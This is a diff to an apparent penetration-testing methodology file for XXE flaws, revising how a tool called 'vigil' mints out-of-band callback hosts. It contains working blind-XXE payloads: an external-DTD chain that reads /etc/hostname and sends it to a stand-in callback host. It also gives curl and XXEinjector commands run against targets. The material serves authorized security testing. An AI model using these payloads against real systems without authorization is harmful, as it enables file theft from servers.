@@ -18,7 +18,7 @@ vuln_class: xxe
 - `vigil assess kali exec -- curl ...` (send crafted XML — all target-facing curl must go through the kali exec wrapper; use `--technique XXE --probe-kind payload --phase consume-test --timeout 30` for XXE attempts)
 - Burp Suite Repeater (craft XML payloads — then replay via kali exec for audit pipeline coverage)
 - XXEinjector (run via `vigil assess kali exec --technique XXE --probe-kind payload --phase consume-test --timeout 300 -- ...`)
-- OOB callbacks: verify readiness with `vigil oob status --json`, then `vigil oob mint` a nonce-tagged callback host (embed it in the external-DTD chain) and `vigil oob poll --client <name>` to correlate the hit — see §4 Blind XXE. This replaces reading the listener log by hand. Fall back to time-based detection when OOB is unavailable.
+- OOB callbacks: verify readiness with `vigil oob status --json`, then `vigil oob mint --client <name>` (binds the nonce under a running interactsh client's id and prints the exact callback host; `--client <name>` required when several clients run) — embed the EXACT host it prints (`$OOB_HOST`) in the external-DTD chain and `vigil oob poll --client <name>` to correlate the hit — see §4 Blind XXE. This replaces reading the listener log by hand. Fall back to time-based detection when OOB is unavailable.
 
 ## Methodology
 
@@ -53,25 +53,25 @@ vuln_class: xxe
 
 ### 4. Blind XXE — Out-of-Band
 
-When the parser resolves entities but the result is not reflected, an external-DTD chain to a minted callback host both confirms the bug and exfiltrates file data. Mint the host first so the hit is self-correlating:
+When the parser resolves entities but the result is not reflected, an external-DTD chain to a minted callback host both confirms the bug and exfiltrates file data. Mint the host first so the hit is self-correlating — substitute the EXACT host `vigil oob mint --client <name>` prints (`$OOB_HOST` — the nonce bound under the client id; never hand-build a bare `<nonce>.oob...` host):
 
 ```bash
 vigil oob status --json   # confirm readiness
-vigil oob mint --technique xxe --target-url "https://target/api/import" --param body --probe-kind http
-# -> dns   <prefix>-<token>.oob.example.com   (this is <NONCE_HOST> below)
+vigil oob mint --client <name> --technique xxe --target-url "https://target/api/import" --param body --probe-kind http
+# -> dns   <prefix>-<token>.<client-id>.oob.example.com   (= $OOB_HOST below)
 ```
 
-- [ ] Parameter entity + external DTD (point at the minted host, served from your kali-side DTD):
+- [ ] Parameter entity + external DTD (point at the minted host `$OOB_HOST`, served from your kali-side DTD):
       ```xml
       <!DOCTYPE foo [
-        <!ENTITY % xxe SYSTEM "http://<NONCE_HOST>/evil.dtd">
+        <!ENTITY % xxe SYSTEM "http://$OOB_HOST/evil.dtd">
         %xxe;
       ]>
       ```
 - [ ] External DTD (`evil.dtd`) — the read file is embedded as a subdomain label of the callback, so it lands in the correlated hit:
       ```xml
       <!ENTITY % file SYSTEM "file:///etc/hostname">
-      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.<NONCE_HOST>/'>">
+      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.$OOB_HOST/'>">
       %eval;
       %exfil;
       ```
